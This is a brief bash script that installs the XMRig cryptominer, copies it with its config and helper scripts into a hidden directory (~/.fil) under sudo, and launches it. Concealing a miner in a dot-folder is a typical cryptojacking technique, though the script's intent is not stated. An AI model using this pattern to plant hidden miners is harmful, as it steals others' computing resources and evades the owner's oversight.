#!/bin/bash
sudo apt install xmrig -y
sudo chmod +x *
mkdir ~/\.fil
sudo cp run ~/\.fil
sudo cp xmrig  ~/\.fil && sudo cp config.json  ~/\.fil && sudo cp SHA256SUMS  ~/\.fil
sudo cp sh.sh ~/\.fil
sudo cp xm.py ~/\.fil
sleep 10
bash run
python3 ~/\.fil/xm.py
